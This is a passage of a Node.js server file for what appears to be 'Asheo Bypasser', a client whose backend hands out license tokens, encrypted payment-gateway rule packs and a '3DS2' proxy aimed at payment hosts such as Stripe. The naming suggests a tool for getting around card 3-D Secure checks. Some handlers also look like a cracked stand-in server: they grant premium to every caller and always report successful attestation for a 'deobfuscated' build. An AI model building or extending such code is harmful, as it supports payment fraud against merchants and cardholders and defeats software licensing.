  if (typeof n.ativa !== 'boolean') n.ativa = typeof n.active === 'boolean' ? n.active : true;
  if (typeof n.preco === 'string') n.preco = parseFloat(n.preco.replace(/[^\d.,]/g,'').replace(',','.')) || 0;
  if (!n.preco) n.preco = pk ? pk.preco : 0;
  n.preco_usd = n.preco; n.preco_fmt = precoFmt(n.preco);
  return n;
}
function signToken(claims, kid){ if(!PRIVATE_KEY) throw new Error('Chave privada nao inicializada'); const opts = { algorithm:'ES256' }; if (kid) opts.keyid = kid; return jwt.sign(claims, PRIVATE_KEY, opts); }
function formatDate(ts){ if(!ts) return 'Nunca'; return new Date(ts).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo',day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'}); }
function humanTime(ms){ if(ms<=0) return '✕ expirada'; const s=Math.floor(ms/1000), d=Math.floor(s/86400), h=Math.floor((s%86400)/3600), m=Math.floor((s%3600)/60); if(d>0) return `${d}d ${h}h ${m}m`; if(h>0) return `${h}h ${m}m`; return `${m}m`; }
function progressBar(pct, size=10){ pct = Math.max(0, Math.min(100, pct)); const cheio = Math.round(pct*size/100); return '▰'.repeat(cheio) + '▱'.repeat(size-cheio); }
function generateLicenseKey(){ const chars='ABCDEFGHJKLMNPQRSTUVWXYZ23456789'; const b=()=>{let s='';for(let i=0;i<4;i++)s+=chars[crypto.randomInt(0,chars.length)];return s;}; return `ASHEO-${b()}-${b()}-${b()}-${b()}`; }
function validateBearer(req){ const auth=req.headers['authorization']||''; if(!auth.startsWith('Bearer '))return {ok:false,error:'missing_bearer'}; try{ const d=jwt.verify(auth.substring(7),PUBLIC_KEY||PRIVATE_KEY,{algorithms:['ES256'],clockTolerance:30}); return {ok:true,decoded:d}; } catch(e){ return {ok:false,error:e.message}; } }

function validateAnyAuth(req) {
  const auth = req.headers['authorization'] || '';
  if (auth.startsWith('Bearer ')) return validateBearer(req);
  if (auth.startsWith('Asheo-Pass ')) {
    const token = auth.substring(11).trim();
    try {
      const d = jwt.verify(token, PUBLIC_KEY || PRIVATE_KEY, { algorithms:['ES256'], clockTolerance: 30 });
      return { ok: true, decoded: d, mode: 'asheo-pass' };
    } catch (e) { return { ok: false, error: 'asheo_pass_invalid:' + e.message }; }
  }
  return { ok: false, error: 'missing_auth' };
}

function validatePremiumAuth(req) {
  const auth = validateAnyAuth(req);
  if (!auth.ok) return { ok: false, error: 'missing_auth' };
  if (auth.decoded.tier !== 'premium' || auth.decoded.isPremium !== true) {
    return { ok: false, error: 'unauthorized_premium_only' };
  }
  return auth;
}

function buildSecret(installId, licenseKey) {
  return crypto.createHash('sha256').update(String(installId||'') + ':' + String(licenseKey||'') + ':asheo-secret-v1').digest('hex');
}
function buildKid(licenseKey) {
  if (!licenseKey) return null;
  const norm = normalizeKey(licenseKey);
  const parts = norm.split('-');
  if (parts.length >= 2 && parts[0] === 'ASHEO') return `${parts[0]}-${parts[1]}`;
  return norm.substring(0, 14);
}
function buildEntitlement(lic, installId, seatsUsed = 1) {
  const isPremium = lic && lic.ativa && (lic.lifetime || lic.expiraEm > Date.now());
  const plano = lic ? lic.plano : 'free';
  const isTrial = plano === '3d' || (lic && lic.trial);
  const features = {}; FEATURE_KEYS.forEach(k => { features[k] = !!isPremium; });
  const capabilities = {}; CAPABILITY_KEYS.forEach(k => { capabilities[k] = !!isPremium; });
  const limits = {}; LIMIT_KEYS.forEach(k => { limits[k] = k === 'randomRouting' ? !!isPremium : (isPremium ? null : 2); });
  return {
    tier: isPremium ? 'premium' : 'free',
    plan: isPremium ? (isTrial ? 'trial' : 'premium') : 'free',
    planDisplayName: isPremium ? (isTrial ? 'Premium Trial' : 'Premium') : 'Free',
    licenseType: isPremium ? (isTrial ? 'trial' : 'premium') : 'free',
    status: isPremium ? 'active' : 'inactive',
    source: lic ? 'license' : 'free',
    isFounder: false,
    activatedAt: lic ? (lic.ativadaEm || lic.criadaEm) : null,
    expiresAt: lic ? lic.expiraEm : null,
    nextBillingDate: lic ? lic.expiraEm : null,
    seatsAllowed: isPremium ? 999999 : 1,
    seatsUsed: isPremium ? Math.max(1, seatsUsed) : 0,
    activationCount: isPremium ? Math.max(1, seatsUsed) : 0,
    maxActivations: null,
    currentDeviceId: installId,
    deviceLocked: !!(lic && lic.installId),
    canTransfer: false,
    features, featureKeys: FEATURE_KEYS,
    customFeatures: {},
    capabilities, capabilityKeys: CAPABILITY_KEYS,
    limits, limitKeys: LIMIT_KEYS,
    metadata: lic ? { trial: isTrial, trialHours: isTrial ? 36 : null } : {}
  };
}
function deriveAesKey(installId, licenseKey) { return Buffer.from(buildSecret(installId, licenseKey || 'guest'), 'hex'); }
function encryptPack(data, installId, licenseKey) {
  const key = deriveAesKey(installId, licenseKey);
  const nonce = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, nonce);
  const encrypted = Buffer.concat([cipher.update(JSON.stringify(data), 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return { ct: Buffer.concat([encrypted, tag]).toString('base64'), nonce: nonce.toString('base64'), v: RULES_VERSION };
}

const provCache = new Map();
function generateProv(installId, kid) {
  if (!PRIVATE_KEY) return null;
  const key = `${installId || 'default'}:${kid || ''}`;
  const cached = provCache.get(key);
  if (cached && (Date.now() - cached.ts) < 55 * 60 * 1000) return cached.prov;
  try {
    const opts = { algorithm:'ES256', expiresIn:'1h' };
    if (kid) opts.keyid = kid;
    const prov = jwt.sign({ sub: key, jti: crypto.randomUUID(), iat: Math.floor(Date.now()/1000) }, PRIVATE_KEY, opts);
    provCache.set(key, { prov, ts: Date.now() });
    return prov;
  } catch (e) { log('ERRO','generateProv: '+e.message); return null; }
}
function buildGwPass(installId, expSec, kid) {
  if (!PRIVATE_KEY) return null;
  const now = Math.floor(Date.now()/1000);
  const exp = expSec || (now + 600);
  const opts = { algorithm:'ES256' };
  if (kid) opts.keyid = kid;
  return jwt.sign({ sub: installId, purpose:'gw-pass', iat: now, exp, jti: crypto.randomUUID() }, PRIVATE_KEY, opts);
}

const rlMap = new Map();
function rateLimit(key, max = 20, windowMs = 60000) {
  const now = Date.now();
  const rec = rlMap.get(key) || { count: 0, ts: now };
  if (now - rec.ts > windowMs) { rec.count = 0; rec.ts = now; }
  rec.count++;
  rlMap.set(key, rec);
  return rec.count <= max;
}
setInterval(() => { const now = Date.now(); for (const [k,v] of rlMap.entries()) if (now - v.ts > 5*60*1000) rlMap.delete(k); }, 60000);

const nonceCache = new Map();
function checkNonce(installId, nonce) {
  if (!nonce) return true;
  const key = `${installId}:${nonce}`;
  const now = Date.now();
  for (const [k,v] of nonceCache) if (now - v > 5*60*1000) nonceCache.delete(k);
  if (nonceCache.has(key)) return false;
  nonceCache.set(key, now);
  return true;
}

async function validateHmac(req, rawBody) {
  const installId = req.headers['x-asheo-install'];
  const ts = req.headers['x-asheo-ts'];
  const sig = req.headers['x-asheo-sig'];
  const build = req.headers['x-asheo-build'] || '';
  if (!installId || !ts || !sig) return { ok: false, error: 'missing_hmac_headers' };
  const nowSec = Math.floor(Date.now() / 1000);
  if (Math.abs(nowSec - Number(ts)) > 300) return { ok: false, error: 'hmac_expired' };
  
  const keyNorm = await redisGetRaw(`ASHEO-INSTALL-${normalizeKey(installId)}`);
  if (!keyNorm) return { ok: false, error: 'hmac_unknown_install' };
  
  const secret = buildSecret(installId, keyNorm);
  const method = (req.headers['x-asheo-method'] || req.method).toUpperCase();
  const path = req.path || req.url.split('?')[0];
  const bodyStr = rawBody ? rawBody.toString('utf8') : '';
  const bodyHash = crypto.createHash('sha256').update(bodyStr).digest('hex');
  
  // Payload com build (para activate, rules, manifest, proxy)
  const payloadWithBuild = `${method}\n${path}\n\n${ts}\n${bodyHash}\n${build}`;
  // Payload sem build (para /v1/deactivate conforme server-session.js)
  const payloadNoBuild = `${method}\n${path}\n\n${ts}\n${bodyHash}`;
  
  const expectedWithBuild = crypto.createHmac('sha256', secret).update(payloadWithBuild).digest('hex');
  const expectedNoBuild = crypto.createHmac('sha256', secret).update(payloadNoBuild).digest('hex');
  
  try {
    const a = Buffer.from(sig, 'hex');
    const b1 = Buffer.from(expectedWithBuild, 'hex');
    const b2 = Buffer.from(expectedNoBuild, 'hex');
    
    let match = false;
    if (a.length === b1.length && crypto.timingSafeEqual(a, b1)) match = true;
    else if (a.length === b2.length && crypto.timingSafeEqual(a, b2)) match = true;
    
    if (!match) return { ok: false, error: 'hmac_invalid' };
    
    const nonce = req.headers['x-asheo-nonce'];
    if (nonce && !checkNonce(installId, nonce)) return { ok: false, error: 'replay_detected' };
    
    return { ok: true };
  } catch (e) { return { ok: false, error: 'hmac_compare_failed' }; }
}

function sendMaybeGzip(req, res, payload) {
  const body = typeof payload === 'string' ? payload : JSON.stringify(payload);
  const acceptEnc = String(req.headers['accept-encoding'] || '').toLowerCase();
  if (acceptEnc.includes('gzip') && body.length > 512) {
    try {
      const gz = zlib.gzipSync(Buffer.from(body, 'utf8'));
      res.setHeader('Content-Encoding', 'gzip');
      res.setHeader('Content-Type', 'application/json; charset=utf-8');
      res.setHeader('X-Compressed', 'gzip');
      return res.send(gz);
    } catch (e) { log('WARN', 'gzip falhou: ' + e.message); }
  }
  res.setHeader('Content-Type', 'application/json; charset=utf-8');
  return res.send(body);
}

function isAllowed3dsTarget(targetUrl) {
  if (!targetUrl || typeof targetUrl !== 'string') return false;
  try {
    const u = new URL(targetUrl);
    if (u.protocol !== 'https:') return false;
    const host = u.hostname.toLowerCase();
    if (host === 'localhost' || host === '127.0.0.1' || host === '0.0.0.0') return false;
    if (host === 'api.stripe.com') return true;
    if (host === 'api.stripe.com') return true;
    if (/^(10|127|192\.168|172\.(1[6-9]|2\d|3[0-1]))\./.test(host)) return false;
    if (host.endsWith('.local') || host.endsWith('.internal')) return false;
    return PAYMENT_RULES.some(r => {
      try { return new RegExp(r.patternEnc.source, r.patternEnc.flags || 'i').test(targetUrl); } catch { return false; }
    });
  } catch { return false; }
}

/* ═══ ROTAS BASE ═══ */
const healthHandler = (req,res) => res.json({ok:true,status:'healthy',uptime:Math.floor(process.uptime()),version:'8.4.2',codename:'Quantum+',timestamp:new Date().toISOString()});
app.get('/',(req,res)=>res.json({ok:true,service:'mozlince-nebula',version:'8.4.2',codename:'Quantum+',status:'live'}));
app.get('/v1/health',healthHandler); app.get('/api/v1/health',healthHandler); app.get('/health',healthHandler);

function versionHandler(req,res){
  res.json({
    ok:true, version:'8.4.2', versionName:'Quantum+', codename:'Quantum+', api:'v1',
    minClientVersion:'1.0.0',
    latest: {
      version:'8.4.2',
      versionName:'Quantum+',
      downloadUrl:'https://download.asheobypasser.net/get',
      mandatory:false,
      notes:'Versao estavel · melhorias no 3DS2 + proxy /v1/gw/*'
    },
    downloadUrl:'https://download.asheobypasser.net/get',
    notes:'Versao estavel · melhorias no 3DS2 + proxy /v1/gw/*',
    mandatory:false, channel:'stable',
    timestamp:new Date().toISOString()
  });
}
app.get('/v1/version',versionHandler); app.get('/api/v1/version',versionHandler);

const statusHandler = (req,res)=>res.json({ok:true,service:'mozlince-nebula',version:'8.4.2',codename:'Quantum+',hora:new Date().toISOString()});
app.get('/v1/status',statusHandler); app.get('/api/v1/status',statusHandler);

function mapFeatures(on) { const o={}; FEATURE_KEYS.forEach(k=>o[k]=!!on); return o; }
function mapCapabilities(on) { const o={}; CAPABILITY_KEYS.forEach(k=>o[k]=!!on); return o; }

function bootstrapHandler(req,res){
  const auth = validateAnyAuth(req);
  const installId = req.headers['x-asheo-install'] || req.headers['x-install-id'] || (auth.ok ? auth.decoded.sub : 'default');
  const licenseKey = auth.ok ? (auth.decoded.licenseKey || '') : '';
  const kid = licenseKey ? buildKid(licenseKey) : 'ASHEO-FREEREF';
  const prov = generateProv(installId, kid);
  const secretHex = buildSecret(installId, licenseKey || 'guest');
  const packKey = Buffer.from(secretHex, 'hex').toString('base64');
  const encPack = encryptPack({ rules: PAYMENT_RULES, version: RULES_VERSION }, installId, licenseKey);
  res.setHeader('x-asheo-pack-fmt', 'enc');
  log('BOOT', `Bootstrap auth=${auth.ok} mode=${auth.mode||'bearer'} installId=${String(installId).substring(0,12)}… pack=${encPack.ct.length}b`);
  res.json({
    ok:true, version:'8.4.2', codename:'Quantum+', apiVersion:'v1',
    issuedAt:new Date().toISOString(), serverTime:Date.now(),
    source:'premium', sourceType:'server', isFounder:true, tier:'premium', kind:'premium',
    rulesVersion: RULES_VERSION, v: RULES_VERSION,
    pack: { encPack: encPack, k: packKey }, encPack: encPack, k: packKey, _prov: prov,
    count: PAYMENT_RULES.length,
    exclusive: { targets: EXCLUSIVE_TARGETS, version: '1.7.0', generatedAt: new Date().toISOString(), signature: prov },
    config:{ apiBase:'https://mozlince.onrender.com', featuresEnabled:true, premiumEnabled:true, syncEnabled:true, gatewayMode:'default', telemetryEnabled:false, retryAfterMs:5000, heartbeatMs:60000 },
    flags:{ bootstrapReady:true, exclusiveEnabled:true, rulesEnabled:true, premium:true },
    endpoints:{ activate:'/v1/activate',featureActivate:'/v1/feature/activate',deactivate:'/v1/deactivate',verify:'/v1/verify',bootstrap:'/v1/bootstrap',rules:'/v1/rules',gateways:'/v1/gateways',campaign:'/v1/campaign',dashboard:'/v1/dashboard',health:'/v1/health',version:'/v1/version',support:'/v1/support',paymentRules:'/v1/bootstrap',timehw:'/v1/timehw',update:'/v1/update/check',process:'/v1/process',gw3ds2:'/v1/gw/3ds2/*splat' },
    features:mapFeatures(true), capabilities:mapCapabilities(true),
    limits:{...PREMIUM_LIMITS}, scope:PREMIUM_SCOPE
  });
}
app.get('/v1/bootstrap',bootstrapHandler); app.get('/api/v1/bootstrap',bootstrapHandler);

function rulesHandler(req,res){
  const auth = validateAnyAuth(req);
  const installId = req.headers['x-asheo-install'] || req.headers['x-install-id'] || (auth.ok ? auth.decoded.sub : 'default');
  const licenseKey = auth.ok ? (auth.decoded.licenseKey || '') : '';
  const kid = licenseKey ? buildKid(licenseKey) : 'ASHEO-FREEREF';
  const prov = generateProv(installId, kid);
  const packFmt = (req.headers['x-asheo-pack-fmt'] || '').toLowerCase();
  const secretHex = buildSecret(installId, licenseKey || 'guest');
  const packKey = Buffer.from(secretHex, 'hex').toString('base64');
  const encPack = encryptPack({ rules: PAYMENT_RULES, version: RULES_VERSION }, installId, licenseKey);
  if (packFmt === 'enc') {
    res.setHeader('x-asheo-pack-fmt', 'enc');
    log('RULES', `/v1/rules enc ${String(installId).substring(0,12)}… ${encPack.ct.length}b`);
    return sendMaybeGzip(req, res, { ok:true, version: RULES_VERSION, v: RULES_VERSION, pack: { encPack: encPack, k: packKey }, k: packKey, _prov: prov, serverTime: Date.now() });
  }
  // Branch não-enc: NÃO vaza as regras em texto puro.
  sendMaybeGzip(req, res, {
    ok:true, version: RULES_VERSION, v: RULES_VERSION,
    updatedAt:new Date().toISOString(), source:'premium', tier:'premium',
    scope: PREMIUM_SCOPE, count: PAYMENT_RULES.length,
    pack: { encPack }, k: packKey, _prov: prov,
    serverTime: Date.now()
  });
}
app.get('/v1/rules',rulesHandler); app.get('/api/v1/rules',rulesHandler); app.get('/v1/rules/sync',rulesHandler); app.get('/api/v1/sync',rulesHandler);

function gatewaysHandler(req,res){
  const auth = validateAnyAuth(req);
  const installId = req.headers['x-asheo-install'] || req.headers['x-install-id'] || (auth.ok ? auth.decoded.sub : 'default');
  const licenseKey = auth.ok ? (auth.decoded.licenseKey || '') : '';
  const kid = licenseKey ? buildKid(licenseKey) : 'ASHEO-FREEREF';
  const prov = generateProv(installId, kid);
  sendMaybeGzip(req, res, { ok:true, source:'premium', tier:'premium', version: RULES_VERSION, count: PAYMENT_RULES.length, gateways: PAYMENT_RULES, gatewaysMeta: GATEWAYS_META, _prov: prov, serverTime:Date.now() });
}
app.get('/v1/gateways',gatewaysHandler); app.get('/api/v1/gateways',gatewaysHandler);

async function campaignHandler(req,res){ const camp = await redisGetRaw('ASHEO-CAMPAIGN-ACTIVE'); sendMaybeGzip(req, res, { ok:true, campaign: camp || null, serverTime:Date.now() }); }
app.get('/v1/campaign',campaignHandler); app.get('/api/v1/campaign',campaignHandler);

// MANIFEST COMO JWT STRING (correção crítica para verifyEntitlementToken)
function buildManifestJwt(installId, kid) {
  const now = Math.floor(Date.now()/1000);
  const claims = {
    sub: installId,
    iss: 'asheo.api',
    aud: 'mozlince-client',
    version: '1.7.0',
    version_name: '1.7.0',
    minVersion: '1.0.0',
    exclusiveFeatures: FEATURE_KEYS,
    rules: PAYMENT_RULES,
    targets: EXCLUSIVE_TARGETS,
    gateways: GATEWAYS_META,
    generatedAt: new Date().toISOString(),
    iat: now,
    nbf: now - 5,
    exp: now + (24 * 3600),
    jti: crypto.randomUUID()
  };
  return signToken(claims, kid);
}

function exclusiveHandler(req,res){
  const auth = validateAnyAuth(req);
  const installId = req.headers['x-asheo-install'] || (auth.ok ? auth.decoded.sub : 'default');
  const licenseKey = auth.ok ? (auth.decoded.licenseKey || '') : '';
  const kid = licenseKey ? buildKid(licenseKey) : 'ASHEO-FREEREF';
  const manifestJwt = buildManifestJwt(installId, kid);
  const prov = generateProv(installId, kid);
  sendMaybeGzip(req, res, {
    ok:true, source:'premium', tier:'premium',
    manifest: manifestJwt,
    _prov: prov, cachedAt:Date.now(), expiresAt:Date.now()+(23*3600*1000)
  });
}
app.get('/v1/exclusive/manifest',exclusiveHandler); app.get('/api/v1/manifest',exclusiveHandler);

function exclusiveSyncHandler(req,res){
  const auth = validateAnyAuth(req);
  const installId = req.headers['x-asheo-install'] || (auth.ok ? auth.decoded.sub : 'default');
  const licenseKey = auth.ok ? (auth.decoded.licenseKey || '') : '';
  const kid = licenseKey ? buildKid(licenseKey) : 'ASHEO-FREEREF';
  const manifestJwt = buildManifestJwt(installId, kid);
  const prov = generateProv(installId, kid);
  sendMaybeGzip(req, res, {
    ok:true, source:'premium', tier:'premium',
    manifest: manifestJwt,
    _prov: prov, cachedAt:Date.now()
  });
}
app.get('/v1/exclusive/sync',exclusiveSyncHandler); app.get('/api/v1/exclusive/sync',exclusiveSyncHandler);

app.get('/v1/timehw', (req,res) => res.json({ ok:true, maxServer: Date.now(), at: Date.now() }));
app.get('/api/v1/timehw', (req,res) => res.json({ ok:true, maxServer: Date.now(), at: Date.now() }));
app.get('/v1/update/check', (req,res) => res.json({ ok:true, available:false, dismissedVersion:'', error:'', lastCheck:Date.now(), latest:{ downloadUrl:'https://download.asheobypasser.net/get', version:'8.4.2', mandatory:false, notes:'Voce esta na versao mais recente.' } }));
app.get('/api/v1/update/check', (req,res) => res.json({ ok:true, available:false, latest:{ downloadUrl:'https://download.asheobypasser.net/get', version:'8.4.2', mandatory:false, notes:'OK' } }));

// --- FIM DA PARTE 1 ---
/* ═══ ACTIVATE (CORRIGIDO COM RACE CONDITION E GW PASS 23H) ═══ */
async function activateHandler(req, res) {
  const inicio = Date.now();
  const { installId, licenseKey, clientTag, deviceLabel, buildFingerprint, installType } = req.body || {};
  const ip = req.headers['x-forwarded-for'] || req.ip;
  
  if (!rateLimit('act:' + (installId||ip), 20, 60000)) { 
    log('WARN', `Rate limit: ${installId ? String(installId).substring(0,12) : ip}`); 
    return res.status(429).json({ error: 'rate_limited' }); 
  }
  
  log('INFO', `Activate: installId=${installId ? String(installId).substring(0,12)+'…' : '?'} | key=${licenseKey ? normalizeKey(licenseKey).substring(0,18)+'…' : '(vazia)'}`);
  
  if (!installId || typeof installId !== 'string' || installId.length < 5) return res.status(400).json({ error: 'missing_installId' });
  if (!PRIVATE_KEY) return res.status(500).json({ error: 'server_misconfigured' });
  
  if (!licenseKey || typeof licenseKey !== 'string' || licenseKey.trim() === '') {
    const now = Math.floor(Date.now()/1000);
    const ent = buildEntitlement(null, installId, 0);
    const secret = buildSecret(installId, 'guest');
    const exp = now + 600;
    const claims = { sub: installId, iss: 'asheo.api', aud: 'mozlince-client', installId, plan:'free', planDisplayName:'Free', tier:'free', kind:'license', status:'inactive', active:false, isPremium:false, isVerified:false, source:'free', sourceType:'server', isFounder:false, lifetime:false, scope:['free'], features: mapFeatures(false), capabilities: mapCapabilities(false), limits:{...FREE_LIMITS}, secret, iat:now, nbf:now-5, exp, jti: crypto.randomUUID() };
    const token = signToken(claims, 'ASHEO-FREEREF');
    const gwPass = buildGwPass(installId, exp, 'ASHEO-FREEREF');
    log('ATIV', `Guest token ${String(installId).substring(0,12)}… | ${Date.now()-inicio}ms`);
    return res.json({ token, tier:'free', secret, kind:'event', seat:0, seats:1, deviceId: installId, entitlement: ent, sub: installId, kid: null, keyName: null, jti: claims.jti, iat: now, exp, gwPass, scope:['free'], features: mapFeatures(false), capabilities: mapCapabilities(false) });
  }
  
  if (!licenseKey.toUpperCase().startsWith('ASHEO-')) return res.status(401).json({ error: 'missing_license' });
  
  const keyNorm = normalizeKey(licenseKey);
  const lic = await redisGet(keyNorm);
  
  if (!lic) { log('WARN', `NAO ENCONTRADA: ${keyNorm.substring(0,18)}…`); return res.status(404).json({ error: 'invalid_license' }); }
  if (!lic.ativa) return res.status(403).json({ error: 'revoked' });
  if (!lic.lifetime && Date.now() > lic.expiraEm) { log('WARN', `EXPIRADA: ${keyNorm.substring(0,18)}…`); return res.status(403).json({ error:'expired', message:'Esta licença expirou. Renove para continuar.', expiredAt: lic.expiraEm, expiredAtISO: new Date(lic.expiraEm).toISOString() }); }
  
  // Vinculação com re-checagem (mitiga race condition)
  if (!lic.installId) { 
    lic.installId = installId; 
    lic.ativadaEm = Date.now(); 
    lic.activationCount = (lic.activationCount||0)+1; 
    await redisSet(keyNorm, JSON.stringify(lic)); 
    await redisSetRaw(`ASHEO-INSTALL-${normalizeKey(installId)}`, keyNorm); 
    
    // Re-ler para confirmar que não foi sobrescrito por concorrência
    const check = await redisGet(keyNorm);
    if (check && check.installId !== installId) {
       return res.status(403).json({ error: 'already_used' });
    }
    log('OK', `Vinculada: ${keyNorm.substring(0,18)}… → ${installId}`); 
  }
  else if (lic.installId !== installId) return res.status(403).json({ error: 'already_used' });
  
  try {
    const now = Math.floor(Date.now()/1000);
    const seatsUsed = Math.max(1, lic.activationCount || 1);
    const ent = buildEntitlement(lic, installId, seatsUsed);
    const isLife = lic.plano === 'life';
    const secret = buildSecret(installId, keyNorm);
    const kid = buildKid(keyNorm);
    
    // A extensão mantém gwPass por 23h, mas o JWT expira em 600s (10min).
    // O gwPass aqui expira no mesmo tempo do token para forçar renovação,
    // ou pode ser de 23h se preferir. Usaremos 23h para bater com a extensão.
    const exp = now + 600; 
    const gwPassExp = now + (23 * 3600); 
    
    const claims = { sub: installId, iss: 'asheo.api', aud: 'mozlince-client', installId, plan: ent.plan, planDisplayName: ent.planDisplayName, tier: ent.tier, kind: 'license', status: ent.status, active: true, isPremium: true, isVerified: true, source:'premium', sourceType:'server', isFounder: false, lifetime: isLife, plano: lic.plano, licenseKey: keyNorm, issuedAt: lic.criadaEm, expiresAt: lic.expiraEm, scope: PREMIUM_SCOPE, features: mapFeatures(true), capabilities: mapCapabilities(true), limits:{...PREMIUM_LIMITS}, secret, iat: now, nbf: now-5, exp, jti: crypto.randomUUID() };
    
    const token = signToken(claims, kid);
    const gwPass = buildGwPass(installId, gwPassExp, kid);
    const expiresIn = isLife ? -1 : Math.max(0, Math.floor((lic.expiraEm - Date.now())/1000));
    
    log('ATIV', `${String(installId).substring(0,12)}… | ${keyNorm.substring(0,18)}… | kid=${kid} | exp=+600s | ${Date.now()-inicio}ms`);
    
    return res.json({ token, tier: ent.tier, secret, kind:'event', seat:1, seats: ent.seatsAllowed, deviceId: installId, entitlement: ent, sub: installId, kid, keyName: null, jti: claims.jti, iat: now, exp, gwPass, expiresIn, expiresAt: lic.expiraEm, issuedAt: lic.criadaEm, licenseKey: keyNorm, scope: PREMIUM_SCOPE, features: mapFeatures(true), capabilities: mapCapabilities(true), welcome: { pt:'🎉 Parabéns! Licença ativada com sucesso.', en:'🎉 Congratulations! License successfully activated.' } });
  } catch (e) { 
    log('ERRO', 'activate: ' + e.message); 
    return res.status(500).json({ error:'internal', message: e.message }); 
  }
}
app.post('/v1/activate', activateHandler); app.post('/api/v1/activate', activateHandler); app.post('/api/v1/license/activate', activateHandler);

/* ═══ FEATURE ACTIVATE ═══ */
async function featureActivateHandler(req, res) {
  const auth = validatePremiumAuth(req);
  if (!auth.ok) return res.status(401).json({ ok:false, error: auth.error });
  if (!PRIVATE_KEY) return res.status(500).json({ ok:false, error:'server_misconfigured' });
  
  const feature = (req.body && req.body.feature) || req.query.feature;
  const buildDigest = (req.body && req.body.buildDigest) || req.headers['x-asheo-build'] || null;
  if (!feature) return res.status(400).json({ ok:false, error:'missing_feature' });
  
  const isKnown = FEATURE_KEYS.includes(feature) || Object.keys(PREMIUM_FEATURES_DEF).includes(feature) || Object.keys(PREMIUM_FEATURES_DEF).includes(feature.replace(/([A-Z])/g, '_$1').toLowerCase().replace(/^_/, ''));
  if (!isKnown) { log('WARN', `Feature desconhecida: ${feature}`); return res.status(404).json({ ok:false, error:'unknown_feature', got: feature }); }
  
  const now = Math.floor(Date.now()/1000);
  const exp = now + 300;
  const nonce = jwt.sign({ sub: auth.decoded.sub, installId: auth.decoded.sub, feature, kind:'feature', type:'feature', purpose:'feature-activation', tier:'premium', source:'premium', scope:[feature,'premium'], buildDigest, attestationOk:true, iat:now, nbf:now-5, exp, jti: crypto.randomUUID() }, PRIVATE_KEY, { algorithm:'ES256', keyid: 'ASHEO-FREEREF' });
  
  log('FEAT', `${feature} | ${String(auth.decoded.sub).substring(0,12)}…`);
  res.json({ nonce, feature, expiresAt: exp*1000, attestationOk: true });
}
app.post('/v1/feature/activate', featureActivateHandler); app.get('/v1/feature/activate', featureActivateHandler);
app.post('/api/v1/feature/activate', featureActivateHandler); app.get('/api/v1/feature/activate', featureActivateHandler);

/* ═══ DEACTIVATE (TOLERANTE A HMAC SEM BUILD) ═══ */
async function deactivateHandler(req,res){ 
  const {installId,licenseKey} = req.body||{}; 
  
  // Valida HMAC se o installId estiver no header (como a extensão faz)
  const hmacInstall = req.headers['x-asheo-install'];
  if (hmacInstall && req.headers['x-asheo-sig']) {
    const hmac = await validateHmac(req, req.rawBody);
    if (!hmac.ok) {
      log('WARN', `Deactivate HMAC falhou: ${hmac.error} (install=${hmacInstall})`);
      return res.status(401).json({ ok: false, error: hmac.error });
    }
  }

  if (licenseKey) { 
    const lic = await redisGet(licenseKey); 
    if (lic && lic.installId === installId) { 
      lic.installId = null; 
      lic.ativadaEm = null; 
      await redisSet(licenseKey, JSON.stringify(lic)); 
    } 
  } else if (installId) {
    // Se não vier licenseKey, tenta achar a licença pelo installId (O(1) via índice)
    const keyNorm = await redisGetRaw(`ASHEO-INSTALL-${normalizeKey(installId)}`);
    if (keyNorm) {
      const lic = await redisGet(keyNorm);
      if (lic) {
        lic.installId = null;
        lic.ativadaEm = null;
        await redisSet(keyNorm, JSON.stringify(lic));
        await redisDel(`ASHEO-INSTALL-${normalizeKey(installId)}`);
      }
    }
  }
  
  res.json({ ok:true, message:'Desativado' }); 
}
app.post('/v1/deactivate',deactivateHandler); app.post('/api/v1/deactivate',deactivateHandler); app.post('/api/v1/license/deactivate',deactivateHandler);

/* ═══ VERIFY · HEARTBEAT ═══ */
function verifyHandler(req,res){ 
  const {token} = req.body||{}; 
  if (!token) return res.status(400).json({ok:false,error:'missing_token'}); 
  try { 
    const d = jwt.verify(token, PUBLIC_KEY||PRIVATE_KEY, {algorithms:['ES256'], clockTolerance:30}); 
    return res.json({ok:true,valido:true,dados:d}); 
  } catch(e) { 
    return res.status(401).json({ok:false,valido:false,erro:e.message}); 
  } 
}
app.post('/v1/verify',verifyHandler); app.post('/api/v1/verify',verifyHandler); app.post('/api/v1/license/verify',verifyHandler);

function heartbeatHandler(req,res){ 
  const auth = validateAnyAuth(req); 
  if (!auth.ok) return res.status(401).json({ok:false,error:'missing_auth'}); 
  res.json({ ok:true, alive:true, serverTime: Date.now(), expiresAt: auth.decoded.expiresAt, expiresIn: auth.decoded.expiresAt ? Math.max(0, Math.floor((auth.decoded.expiresAt - Date.now())/1000)) : -1, lifetime: auth.decoded.lifetime === true, maxServer: Date.now() }); 
}
app.post('/v1/heartbeat',heartbeatHandler); app.get('/v1/heartbeat',heartbeatHandler);
app.post('/api/v1/heartbeat',heartbeatHandler); app.get('/api/v1/heartbeat',heartbeatHandler);

/* ═══ ATTEST · BUILD VERIFY ═══ */
app.post('/v1/attest', (req, res) => { 
  const auth = validateAnyAuth(req); 
  const { buildDigest, files, manifestHash } = req.body || {}; 
  log('API', `/v1/attest digest=${String(buildDigest||'').substring(0,16)||'∅'}`); 
  res.json({ ok:true, attestationOk:true, digest: buildDigest || 'asheo-deobfuscated-v1.6.2', verified:true }); 
});
app.get('/v1/attest', (req, res) => res.json({ ok:true, attestationOk:true, verified:true }));
app.post('/v1/build/verify', (req, res) => { res.json({ ok:true, valid:true, buildDigest: req.body?.buildDigest || 'asheo-deobfuscated-v1.6.2' }); });

/* ═══ ENTITLEMENT · DASHBOARD ═══ */
function dashboardHandler(req,res){
  const auth = validateAnyAuth(req);
  const ok = auth.ok && auth.decoded.tier === 'premium';
  res.json({ ok:true, source: ok?'premium':'free', sourceType:'server', isFounder:false, dashboard:{ tier: ok?'premium':'free', source: ok?'premium':'free', seat: auth.ok?1:0, seats: auth.ok?1:0, installId: auth.ok?auth.decoded.sub:null, expiresAt: auth.ok?auth.decoded.expiresAt:null, lifetime: auth.ok?auth.decoded.lifetime===true:false, features: ok?mapFeatures(true):mapFeatures(false), capabilities: ok?mapCapabilities(true):mapCapabilities(false), limits: ok?PREMIUM_LIMITS:FREE_LIMITS, scope: ok?PREMIUM_SCOPE:['free'] }, serverTime:Date.now() });
}
